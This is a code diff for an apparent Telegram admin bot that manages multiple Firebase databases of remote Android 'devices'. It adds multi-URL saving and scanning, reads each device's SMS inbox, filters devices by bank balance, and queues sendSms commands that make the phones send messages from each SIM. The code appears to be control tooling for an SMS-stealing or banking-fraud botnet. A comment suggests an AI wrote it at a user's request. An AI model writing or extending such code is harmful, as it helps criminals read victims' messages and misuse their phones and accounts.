@@ -834,39 +834,30 @@ def _pick_device_number(client_node: dict[str, Any]) -> str:
     return ""
 
 
-async def _messages_contain_check(device_id: str, expected_text: str, since_ts: float) -> bool:
-    """Confirm by inbox (Panel SMS tab): body equals expected check text."""
+async def _inbox_has_texts(device_id: str, texts: list[str]) -> dict[str, bool]:
+    """Read messages/{id} once and see which check texts are present."""
+    found = {t: False for t in texts}
     try:
         node = await firebase_read(f"messages/{device_id}")
     except Exception:
-        return False
+        return found
     if not isinstance(node, dict):
-        return False
-    target = expected_text.strip().upper()
+        return found
+    bodies: list[str] = []
     for _, item in node.items():
         if not isinstance(item, dict):
             continue
-        text = str(item.get("message") or item.get("body") or item.get("text") or "").strip()
-        if text.upper() == target or target in text.upper():
-            return True
-    return False
+        text = str(item.get("message") or item.get("body") or item.get("text") or "").strip().upper()
+        if text:
+            bodies.append(text)
+    for t in texts:
+        tu = t.strip().upper()
+        found[t] = any(tu == b or tu in b for b in bodies)
+    return found
 
 
-async def check_one_sim(device_id: str, client_node: dict[str, Any], sim_slot: int) -> bool:
-    """
-    Same as Panel Send tab:
-      from = 1 or 2 (SIM)
-      to   = device own number
-      message = "SIM 1 ACTIVE" / "SIM 2 ACTIVE"
-      isSended starts false; device sets true after send
-    Also accept confirmation if check text appears in messages/{id} inbox.
-    """
-    to_number = _pick_device_number(client_node)
-    if not to_number or len(_normalize_phone(to_number)) < 10:
-        log.debug("SMS check skip %s SIM%s: no device number", device_id, sim_slot)
-        return False
-
-    msg_text = f"SIM {sim_slot} ACTIVE"
+async def _queue_sim_sms(device_id: str, to_number: str, sim_slot: int, msg_text: str) -> bool:
+    """Queue sendSms for one SIM (Panel style). Returns True if write succeeded."""
     payload = {
         "from": sim_slot,
         "to": to_number,
@@ -874,29 +865,58 @@ async def check_one_sim(device_id: str, client_node: dict[str, Any], sim_slot: i
         "isSended": False,
     }
     path = f"clients/{device_id}/webhookEvent/sendSms"
-    started = time.time()
     try:
         await firebase_write(path, payload)
+        return True
     except Exception as exc:
         log.warning("sendSms queue failed %s SIM%s: %s", device_id, sim_slot, exc)
         return False
 
+
+async def _wait_sim_confirm(device_id: str, msg_text: str, slot: int) -> bool:
+    """After queue: wait until message appears in SMS inbox (primary) or isSended."""
+    path = f"clients/{device_id}/webhookEvent/sendSms"
     deadline = time.time() + SMS_CHECK_TIMEOUT
     while time.time() < deadline:
-        await asyncio.sleep(1.5)
-        # 1) webhook confirm
+        await asyncio.sleep(1.2)
+        inbox = await _inbox_has_texts(device_id, [msg_text])
+        if inbox.get(msg_text):
+            return True
         try:
             node = await firebase_read(path)
             if isinstance(node, dict):
                 flag = node.get("isSended")
                 if flag is True or str(flag).lower() in {"true", "1"}:
-                    return True
+                    # isSended alone is weak if device always sets it; still accept
+                    # but prefer inbox — if isSended and message matches last payload
+                    if str(node.get("message", "")).strip().upper() == msg_text.upper():
+                        return True
         except Exception:
             pass
-        # 2) inbox confirm (self-SMS shows in SMS tab like panel screenshots)
-        if await _messages_contain_check(device_id, msg_text, started):
-            return True
     return False
+
+
+async def check_device_sims(device_id: str, client_node: dict[str, Any]) -> tuple[bool, bool]:
+    """
+    Exact flow user asked:
+      1) Send check SMS via SIM 1 → wait & check in messages inbox
+      2) Send check SMS via SIM 2 → wait & check in messages inbox
+      3) Return which SIMs are ACTIVE
+    """
+    to_number = _pick_device_number(client_node)
+    if not to_number or len(_normalize_phone(to_number)) < 10:
+        log.debug("SMS check skip %s: no device number", device_id)
+        return False, False
+
+    msg1, msg2 = "SIM 1 ACTIVE", "SIM 2 ACTIVE"
+    sim1 = sim2 = False
+
+    if await _queue_sim_sms(device_id, to_number, 1, msg1):
+        sim1 = await _wait_sim_confirm(device_id, msg1, 1)
+    if await _queue_sim_sms(device_id, to_number, 2, msg2):
+        sim2 = await _wait_sim_confirm(device_id, msg2, 2)
+
+    return sim1, sim2
 
 
 async def run_sms_checks_on_records(
@@ -904,26 +924,26 @@ async def run_sms_checks_on_records(
     clients: dict[str, Any],
     devices: dict[str, Any],
 ) -> None:
-    """For eligible online devices, verify SIM1 and SIM2 via Panel sendSms + confirm."""
+    """Eligible online devices: send SIM check msgs then verify via SMS inbox."""
     eligible = [
         r for r in records
         if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
     ]
-    # Sequential-ish: few parallel to avoid flooding devices
-    sem = asyncio.Semaphore(2)
+    sem = asyncio.Semaphore(3)  # keep fast but not flood
 
     async def one(rec: Record) -> None:
         async with sem:
             cid = rec.client_id or rec.device_id
             if not cid:
                 return
-            node = {}
+            node: dict[str, Any] = {}
             if isinstance(clients.get(cid), dict):
                 node.update(clients[cid])
             if isinstance(devices.get(cid), dict):
                 node.update(devices[cid])
-            rec.sim1_active = await check_one_sim(cid, node, 1)
-            rec.sim2_active = await check_one_sim(cid, node, 2)
+            s1, s2 = await check_device_sims(cid, node)
+            rec.sim1_active = s1
+            rec.sim2_active = s2
 
     await asyncio.gather(*(one(r) for r in eligible))
 
@@ -980,7 +1000,6 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
         f"With Balance ≥ ₹{int(BALANCE_THRESHOLD)}: <b>{s['with_balance_ge_threshold']}</b>",
         f"Configured sender IDs: {esc(', '.join(sorted(allowed_senders)) or '(none)')}",
         f"Mode: {esc(mode)}",
-        f"SMS check: public Firebase write (ERA)",
         "",
     ]
     if not shown:
@@ -1058,7 +1077,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/scan [path] fresh scan\n"
         "/report [all|missing]\n"
         "/export [all|missing]\n"
-        "/firebase <URL> show Firebase URL details\n"
+        "/firebase <URL> | list | all | clear\n"
         "/allowclient ID1 ID2\n"
         "/removeclient ID\n"
         "/listclients\n"
@@ -1070,11 +1089,46 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+def _valid_fb_url(value: str) -> bool:
+    parsed = urlparse(value.strip())
+    host = (parsed.hostname or "").lower()
+    return parsed.scheme == "https" and (
+        host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")
+    )
+
+
+def list_firebase_urls() -> list[str]:
+    raw = store.get("firebase_urls", "").strip()
+    urls = [u.strip().rstrip("/") for u in raw.split(",") if u.strip()]
+    current = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/")
+    if current and current not in urls:
+        urls.insert(0, current)
+    # unique preserve order
+    seen: set[str] = set()
+    out: list[str] = []
+    for u in urls:
+        if u not in seen:
+            seen.add(u)
+            out.append(u)
+    return out
+
+
+def add_firebase_url(value: str) -> bool:
+    value = value.strip().rstrip("/")
+    if not _valid_fb_url(value):
+        return False
+    urls = list_firebase_urls()
+    if value not in urls:
+        urls.append(value)
+    store.set("firebase_urls", ",".join(urls))
+    store.set("firebase_url", value)  # active
+    return True
+
+
 def firebase_url_details(value: str) -> str:
     parsed = urlparse(value.strip())
     host = (parsed.hostname or "").lower()
-    allowed = host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")
-    if parsed.scheme != "https" or not allowed:
+    if not _valid_fb_url(value):
         return "Invalid Firebase Realtime Database URL. Use an https://...firebaseio.com or https://...firebasedatabase.app URL."
     configured = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip()
     match = configured.rstrip("/") == value.strip().rstrip("/") if configured else False
@@ -1082,36 +1136,76 @@ def firebase_url_details(value: str) -> str:
         "Firebase URL received.\n"
         f"Host: {esc(host)}\n"
         f"Path: {esc(parsed.path or '/')}\n"
-        f"Configured in this process: {'yes' if match else 'no'}\n\n"
-        "This URL is used only for a public HTTPS .json read. The database rules must allow read access; private keys are never accepted in Telegram."
+        f"Configured in this process: {'yes' if match else 'no'}\n"
+        f"Saved list count: {len(list_firebase_urls())}"
     )
 
 
 @admin_only
 async def firebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    value = context.args[0].strip() if context.args else os.getenv("FIREBASE_DATABASE_URL", "").strip()
-    if not value:
-        await update.effective_message.reply_text("Usage: /firebase https://your-project-default-rtdb.firebaseio.com")
+    args = context.args or []
+    if not args:
+        urls = list_firebase_urls()
+        if not urls:
+            await update.effective_message.reply_text(
+                "Usage:\n"
+                "/firebase <URL> — add & scan one\n"
+                "/firebase list — saved URLs\n"
+                "/firebase all — scan all saved URLs\n"
+                "/firebase clear — clear list"
+            )
+            return
+        await update.effective_message.reply_text(
+            "Saved Firebases:\n" + "\n".join(f"{i+1}. {u}" for i, u in enumerate(urls))
+        )
         return
-    parsed = urlparse(value)
-    host = (parsed.hostname or "").lower()
-    if parsed.scheme != "https" or not (host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")):
+
+    cmd0 = args[0].lower()
+    if cmd0 == "list":
+        urls = list_firebase_urls()
+        await update.effective_message.reply_text(
+            "Saved Firebases:\n" + ("\n".join(f"{i+1}. {u}" for i, u in enumerate(urls)) or "(empty)")
+        )
+        return
+    if cmd0 == "clear":
+        store.set("firebase_urls", "")
+        await update.effective_message.reply_text("Firebase URL list cleared.")
+        return
+    if cmd0 == "all":
+        await scan_all_firebases(update.effective_message)
+        return
+
+    value = args[0].strip()
+    if not _valid_fb_url(value):
         await update.effective_message.reply_text(firebase_url_details(value))
         return
-    store.set("firebase_url", value.rstrip("/"))
-    await update.effective_message.reply_text("Firebase URL saved. Scanning online devices …")
+    add_firebase_url(value)
+    await update.effective_message.reply_text(
+        f"Firebase saved ({len(list_firebase_urls())} total). Scanning …"
+    )
     await run_scan(update.effective_message, ROOT_PATH, "online_no_match", True)
 
 
 @admin_only
 async def firebase_url_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     value = (update.effective_message.text or "").strip()
-    if value.startswith("http://") or value.startswith("https://"):
-        parsed = urlparse(value)
-        host = (parsed.hostname or "").lower()
-        if host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app"):
-            store.set("firebase_url", value.rstrip("/"))
-            await update.effective_message.reply_text("Firebase URL saved. Scanning online devices …")
+    # Support multiple URLs in one message (one per line or space-separated)
+    parts = [p.strip() for p in re.split(r"[\s,]+", value) if p.strip().startswith("http")]
+    if not parts and (value.startswith("http://") or value.startswith("https://")):
+        parts = [value]
+    added = 0
+    last = ""
+    for p in parts:
+        if _valid_fb_url(p):
+            add_firebase_url(p)
+            added += 1
+            last = p
+    if added:
+        await update.effective_message.reply_text(
+            f"Saved {added} Firebase URL(s). Total: {len(list_firebase_urls())}. Scanning last …"
+        )
+        if last:
+            store.set("firebase_url", last.rstrip("/"))
             await run_scan(update.effective_message, ROOT_PATH, "online_no_match", True)
 
 
@@ -1207,6 +1301,23 @@ async def _fetch_messages_for_ids(
         batch = client_ids[i : i + concurrency * 3]
         await asyncio.gather(*(one(cid) for cid in batch))
     return out
+
+
+async def scan_all_firebases(message: Any) -> None:
+    """Scan every saved Firebase URL sequentially (fast enough, clear progress)."""
+    urls = list_firebase_urls()
+    if not urls:
+        await message.reply_text("No Firebase URLs saved. Send a URL or /firebase <URL>")
+        return
+    await message.reply_text(f"Scanning {len(urls)} Firebase(s) …")
+    for i, url in enumerate(urls, 1):
+        store.set("firebase_url", url)
+        await message.reply_text(f"[{i}/{len(urls)}] {url}")
+        try:
+            await run_scan(message, ROOT_PATH, "online_no_match", with_buttons=(i == len(urls)))
+        except Exception as exc:
+            await message.reply_text(f"Failed {url}: {esc(exc)}")
+    await message.reply_text("All Firebase scans finished.")
 
 
 async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_buttons: bool = True) -> None:
